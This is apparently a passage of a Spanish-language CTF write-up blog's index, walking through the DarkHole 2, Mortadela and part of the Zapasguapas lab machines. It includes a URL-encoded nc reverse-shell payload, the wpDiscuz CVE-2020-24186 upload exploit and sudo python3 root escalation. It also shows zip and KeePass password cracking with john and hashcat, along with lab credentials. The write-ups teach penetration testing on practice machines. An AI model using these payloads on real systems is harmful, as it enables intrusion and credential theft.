Address:Port Peer Address:Port Process LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* LISTEN 0 4096 127.0.0.1:9999 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 70 127.0.0.1:33060 0.0.0.0:* ESTAB 0 0 192.168.64.129:22 192.168.64.128:48028 timer:(keepalive,117min,0) LISTEN 0 511 *:80 *:* LISTEN 0 128 [::]:22 [::]:*\rSigue activo, vamos a enviarle un petición con curl:\njehad@darkhole:~$ curl localhost:9999 Parameter GET[\u0026#39;cmd\u0026#39;]\rVemos que espera un parámetro por GET llamado cmd, vamos a enviarselo con un valor de un comando del sistema como id, ya que normalmente el parámetro cmd se emplea para ejecutar comandos a nivel de sistema:\njehad@darkhole:~$ curl localhost:9999?cmd=id Parameter GET[\u0026#39;cmd\u0026#39;]uid=1002(losy) gid=1002(losy) groups=1002(losy) uid=1002(losy) gid=1002(losy) groups=1002(losy)\rVemos que lo ejecuta como el usuario losy, vamos a ponernos en escucha en otra shell por ssh ya que esto corre por su localhost y no llegará a nuestra máquina, vamos a ver si tiene nc:\njehad@darkhole:~$ nc usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]\rBien nos pondremos en escucha en el puerto 8081:\njehad@darkhole:~$ nc -nlvp 8081 Listening on 0.0.0.0 8081\rAhora enviaremos la reverse shell sacada de Online - Reverse Shell Generator:\njehad@darkhole:~$ curl \u0026#34;http://127.0.0.1:9999/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20127.0.0.1%208081%20%3E%2Ftmp%2Ff\u0026#34;\rAhora veremos si se estableció conexión:\njehad@darkhole:~$ nc -nlvp 8081 Listening on 0.0.0.0 8081 Connection received on 127.0.0.1 34774 sh: 0: can\u0026#39;t access tty; job control turned off $\rBien! Pongamos whoami para ver si somos losy:\n$ whoami losy\rVemos que estamos en el directorio /opt/web donde vemos un index.php:\nlosy@darkhole:/opt/web$ cat index.php \u0026lt;?php echo \u0026#34;Parameter GET[\u0026#39;cmd\u0026#39;]\u0026#34;; if(isset($_GET[\u0026#39;cmd\u0026#39;])){ echo system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt;\rAhí vemos que recoje el valor del parámetro por GET y ejecuta como comando del sistema con system.\nShell as root Vamos a ver el .bash_history del usuario losy:\nUsername Password Servicio root darkhole_2 mysql lush@admin.com 321 login (http) jehad fool ssh losy gang Ahora vamos a hacer un sudo -l:\nlosy@darkhole:~$ sudo -l [sudo] password for losy: Matching Defaults entries for losy on darkhole: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User losy may run the following commands on darkhole: (root) /usr/bin/python3\rLo que haremos es ejecutar python3 como root e importar la libreria os:\nlosy@darkhole:~$ sudo python3 -c \u0026#34;import os; os.system(\u0026#39;id\u0026#39;)\u0026#34; uid=0(root) gid=0(root) groups=0(root)\rlosy@darkhole:~$ sudo python3 -c \u0026#34;import os; os.system(\u0026#39;/bin/bash\u0026#39;)\u0026#34; root@darkhole:/home/losy# whoami root\rroot! ;)\n","date":"2025-07-18","id":13,"permalink":"/writeups/vulnhub/darkhole2/","summary":"Enumeration Vamos a empezar escaneando la red local:\n┌──(pylon㉿kali)-[~/…/pylon/Vulnhub/DarkHole2/nmap] └─$ sudo arp-scan -I eth0 --localnet [sudo] password for pylon: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192.","tags":[],"title":"DarkHole 2"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:24 CEST Initiating ARP Ping Scan at 12:24 Scanning 192.168.231.130 [1 port] Completed ARP Ping Scan at 12:24, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:24 Scanning 192.168.231.130 [65535 ports] Discovered open port 22/tcp on 192.168.231.130 Discovered open port 3306/tcp on 192.168.231.130 Discovered open port 80/tcp on 192.168.231.130 Completed SYN Stealth Scan at 12:24, 0.87s elapsed (65535 total ports) Nmap scan report for 192.168.231.130 Host is up, received arp-response (0.00041s latency). Scanned at 2025-07-17 12:24:31 CEST for 1s Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 3306/tcp open mysql syn-ack ttl 64 MAC Address: 00:0C:29:39:0A:C9 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rYa vemos varios puertos abiertos, donde está expuesto el puerto 3306 de MySQL así que quizás a futuro tendremos que entrar a ella. Vamos a realizar un segundo escaneo nmap para ver las versiones de los servicios y lanzar algunos scripts básicos de reconocmiento:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ nmap -p22,80,3306 -sCV 192.168.231.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:25 CEST Nmap scan report for 192.168.231.130 Host is up (0.00019s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA) |_ 256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: Apache2 Debian Default Page: It works |_http-server-header: Apache/2.4.57 (Debian) 3306/tcp open mysql MariaDB 5.5.5-10.11.6 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.11.6-MariaDB-0+deb12u1 | Thread ID: 7431 | Capabilities flags: 63486 | Some Capabilities: Support41Auth, SupportsCompression, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, FoundRows, SupportsTransactions, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: u6IN++4cwLUF?J4f\u0026amp;(3j |_ Auth Plugin Name: mysql_native_password MAC Address: 00:0C:29:39:0A:C9 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.38 seconds\rVamos a ver la aplicación web:\nVemos que es la página por defecto de Apache2, vamos a realizar fuzzing a ver si encontramos otras cosas más interesantes:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.130/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.130/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 0ms] wordpress [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 0ms]\rVemos la carpeta wordpress vamos a entrar en ella:\nAviso\nEs normal que noteís que la aplicación web va lenta, ya que tiene un fallo de virtualhosting. Esto no afecta a la resolución de la máquina.\nVamos a emplear wpscan para tirar un enumeramiento a toda la aplicación Wordpress:\n_______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.28 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://192.168.231.130/wordpress/ [192.168.231.130] [+] Started: Wed Jul 16 20:07:47 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.57 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://192.168.231.130/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://192.168.231.130/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://192.168.231.130/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30). | Found By: Emoji Settings (Passive Detection) | - http://192.168.231.130/wordpress/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=6.4.3\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://192.168.231.130/wordpress/, Match: \u0026#39;WordPress 6.4.3\u0026#39; [i] The main theme could not be detected. [i] Plugin(s) Identified: [+] akismet | Location: http://192.168.231.130/wordpress/wp-content/plugins/akismet/ | Last Updated: 2025-07-15T18:17:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.5 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/, status: 200 | | Version: 5.3.1 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/akismet/readme.txt [+] wpdiscuz | Location: http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/ | Last Updated: 2025-06-29T17:10:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/readme.txt | [!] The version is out of date, the latest version is 7.6.33 | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/, status: 200 | | Version: 7.0.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/plugins/wpdiscuz/readme.txt [i] Theme(s) Identified: [+] twentytwentyfive | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/ | Latest Version: 1.2 (up to date) | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/readme.txt | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/style.css | Style Name: Twenty Twenty-Five | Style URI: https://wordpress.org/themes/twentytwentyfive/ | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfive/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentytwentyfour | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.3 | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/, status: 200 | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: \u0026#39;Version: 1.0\u0026#39; [+] twentytwentythree | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/ | Last Updated: 2024-11-13T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/readme.txt | [!] The version is out of date, the latest version is 1.6 | [!] Directory listing is enabled | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/style.css | Style Name: Twenty Twenty-Three | Style URI: https://wordpress.org/themes/twentytwentythree | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6.... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentythree/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentytwentytwo | Location: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/ | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/readme.txt | [!] The version is out of date, the latest version is 2.0 | Style URL: http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/style.css | Style Name: Twenty Twenty-Two | Style URI: https://wordpress.org/themes/twentytwentytwo/ | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/, status: 200 | | Version: 1.6 (80% confidence) | Found By: Style (Passive Detection) | - http://192.168.231.130/wordpress/wp-content/themes/twentytwentytwo/style.css, Match: \u0026#39;Version: 1.6\u0026#39; [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Wed Jul 16 20:10:44 2025 [+] Requests Done: 141687 [+] Cached Requests: 24 [+] Data Sent: 41.292 MB [+] Data Received: 19.208 MB [+] Memory used: 442.492 MB [+] Elapsed time: 00:02:56\rVemos que encontró un plugin llamado wpdiscuz que tiene la versión 7.0.4 vamos a buscarlo por Google:\nEn mi caso encontré este repositorio con el exploit:\nRepositorio\rScript en python automatizado para el PoC del CVE-2020-24186\nShell as www-data Para emplearlo nos piden lo siguiente:\n-u -\u0026gt; URL objetivo que en este caso es http://192.168.231.130/wordpress/ -p -\u0026gt; Un post donde se emplee este plugin, donde desonocemos de uno. Vamos a buscar un post, viendo la web me percato de lo siguiente:\nSi le damos click nos redirige a un post, lo encontramos!!\nAviso\nAl darle click nos redirigirá a http://192.168.0.108/.... tendremos que cambiar la IP por la correspondiente.\nLa web no carga, seguramente por el virtual hosting, vamos a usar el exploit!\nAntes de explotarlo nos pondremos en escucha:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/exploits] └─$ rlwrap nc -nlvp 9001 listening on [any] 9001 ...\rAhora iniciamos el exploit:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/exploits] └─$ python3 exploit.py -u http://192.168.231.130/wordpress -p /index.php/2024/04/01/hola-mundo/ -l 192.168.231.128 -s 9001 --------------------------------------------------------------- [-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution [-] File Upload Bypass Vulnerability - PHP Reverse Shell Upload [-] CVE: CVE-2020-24186 [-] Modified by Substing https://github.com/substing [-] Based on https://github.com/hev0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE [-] PHP Reverse shell from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php [-] For educational and pentesting purposes only. FOLLOW THE LAWS! --------------------------------------------------------------- [+] Response length:[93144] | code:[200] [!] Got wmuSecurity value: 713c6a0844 [!] Got wmuSecurity value: 1 [+] Generating random name for shell... [!] Generated shell name: oumyxrnjcrfkfqs [!] Trying to Upload Shell.. [+] Upload Success... [+] In your terminal run: nc -nvlp 9001 [+] Navigate to http://192.168.0.108/wordpress/wp-content/uploads/2025/07/oumyxrnjcrfkfqs-1752749705.993.php\rBien nos ha creado y subido una webshell, vamos a entrar a ese archivo:\nAviso\nAl darle click nos redirigirá a http://192.168.0.108/.... tendremos que cambiar la IP por la correspondiente.\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/exploits] └─$ rlwrap nc -nlvp 9001 listening on [any] 9001 ... connect to [192.168.231.128] from (UNKNOWN) [192.168.231.130] 40616 Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux 12:55:59 up 47 min, 0 user, load average: 0.00, 0.00, 0.16 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can\u0026#39;t access tty; job control turned off $\rShell as root Si leemos el /etc/passwd nos percataremos de un usuario:\n──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── www-data@mortadela:/$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin mortadela:x:1000:1000:mortadela,,,:/home/mortadela:/bin/bash mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false\rVemos el usuario mortadela pero no tenemos ningún tipo de credenciales. Vamos a buscar el archivo wp-config.php donde encontraremos las credenciales de la base de datos:\n[..] // ** Database settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** Database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpress\u0026#39; ); /** Database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;lolalolitalola\u0026#39; ); /** Database hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); /** Database charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); /** The database collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); [...]\rEncontramos que el usuario wordpress su credencial a la base de datos es lolalolitalola, pero si intentamos acceder no tendremos permisos. Vamos a seguir buscando por el sistema. Viendo el directorio /opt/ me encontré lo siguiente:\nwww-data@mortadela:/$ ls /opt ls /opt muyconfidencial.zip\rVamos a abrir un servidor en python3 y bajarnos ese archivo .zip:\nwww-data@mortadela:/opt$ python3 -m http.server 8083 python3 -m http.server 8083 Serving HTTP on 0.0.0.0 port 8083 (http://0.0.0.0:8083/) ...\r┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ wget http://192.168.231.130:8083/muyconfidencial.zip --2025-07-17 13:02:36-- http://192.168.231.130:8083/muyconfidencial.zip Connecting to 192.168.231.130:8083... connected. HTTP request sent, awaiting response... 200 OK Length: 93052465 (89M) [application/zip] Saving to: ‘muyconfidencial.zip’ muyconfidencial.zip 100%[=================================================================================================\u0026gt;] 88.74M 89.1MB/s in 1.0s 2025-07-17 13:02:37 (89.1 MB/s) - ‘muyconfidencial.zip’ saved [93052465/93052465]\rVamos a intentar descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password:\rNos piden credenciales, vamos a ver si se reutilizan las de mysql:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password: password incorrect--reenter:\rVemos que no, así que haremos fuerza bruta. Sacaremos el hash con zip2john:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ zip2john muyconfidencial.zip \u0026gt; hash ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0 ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time.\rAhora con john haremos un ataque de fuerza bruta con la wordlist rockyou.txt:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ john -w=/usr/share/wordlists/rockyou.txt hash --format=PKZIP Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status pinkgirl (muyconfidencial.zip) 1g 0:00:00:00 DONE (2025-07-17 13:07) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rJohn\nAñadimos el parametro --format=PKZIP ya que el hash si leemos sus primeras lineas nos indica que es de formato PKZIP.\nYa teniendo la contraseña vamos a descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ unzip muyconfidencial.zip Archive: muyconfidencial.zip [muyconfidencial.zip] Database.kdbx password: extracting: Database.kdbx inflating: KeePass.DMP\rVemos que tenemos 2 archivos de KeePass, vamos a abrir Database.kdbx:\nNos pide una Master Key, buscando en google me encontré el siguiente repositorio:\nkeepass-dump-extractor\rKeePass Memory Dump Extractor\nNos podrá ser de ayuda ya que tenemos el archivo KeePass.DMP, así que vamos a emplearlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ ./keepass-dump-extractor KeePass.DMP -f all \u0026gt; wordlist\rEsto nos ha creado posibles combinaciones de Master Key, ahora con keepass2john vamos a sacar el hash de Database.kdbx:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] └─$ keepass2john Database.kdbx \u0026gt; hash_keepass\rAhora con hashcat vamos a hacerle un ataque de fuerza bruta:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/content] 13:17:21 [19/19] └─$ hashcat -m 13400 --username hash_keepass wordlist --potfile-disable hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ==================================================================================================================================================== * Device #1: cpu-skylake-avx512-AMD Ryzen 5 7600X 6-Core Processor, 2201/4466 MB (1024 MB allocatable), 4MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Single-Hash * Single-Salt Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 1 MB Dictionary cache built: * Filename..: wordlist * Passwords.: 570 * Bytes.....: 9025 * Keyspace..: 570 * Runtime...: 0 secs $keepass$*2*60000*0*93809672768b681bd065a3f15b50cf58e0ec612024580a60c67cdb842c3d2273*142d5f1e47d60a3bfda60e3689051621ccb647ef218e6b59b4299e21adfb90d0*dc28dc2d815d5f6632cf34cfb81f38be*565454906826c80142d135dac98968adadb0ebc1d99aecb0abe87cd3bc02b137*64c4082fac98e04e9ad511e188931ee4c0e4b22e015f5df2da173a86a782cde2:Maritrini12345 [..]\rTenemos la Master Key!! Vamos a probarla\nVamos a iniciar sesión por SSH:\n┌──(pylon㉿kali)-[~] └─$ ssh root@192.168.231.130 root@192.168.231.130\u0026#39;s password: Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 12:17:41 2025 from 192.168.231.128 root@mortadela:~# whoami; hostname -I root 192.168.231.130\rroot! ;)\nReseña ","date":"2025-07-17","id":14,"permalink":"/writeups/thehackerslabs/mortadela/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Mortadela/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.130 Starting Nmap 7.","tags":[],"title":"Mortadela"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] └─$ nmap -p- --open --min-rate=5000 -n -Pn -vvv 192.168.231.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 13:53 CEST Initiating ARP Ping Scan at 13:53 Scanning 192.168.231.131 [1 port] Completed ARP Ping Scan at 13:53, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:53 Scanning 192.168.231.131 [65535 ports] Discovered open port 22/tcp on 192.168.231.131 Discovered open port 80/tcp on 192.168.231.131 Completed SYN Stealth Scan at 13:53, 1.06s elapsed (65535 total ports) Nmap scan report for 192.168.231.131 Host is up, received arp-response (0.000047s latency). Scanned at 2025-07-17 13:53:30 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:C6:42:17 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVamos a realizar un segundo escaneo para determinar la versión del servicio de cada y lanzar algunos scripts básicos de reconocimiento:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] └─$ nmap -p22,80 -sCV 192.168.231.131 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 13:54 CEST Nmap scan report for 192.168.231.131 Host is up (0.00018s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 7e:42:d0:d4:c9:36:f4:f8:e6:77:c2:c6:7e:25:dc:ff (ECDSA) |_ 256 6f:a0:50:44:9f:a2:fb:99:40:f3:90:af:56:cc:34:e3 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-server-header: Apache/2.4.57 (Debian) |_http-title: Zapasguapas MAC Address: 00:0C:29:C6:42:17 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds\rBien vamos a ver la aplicación 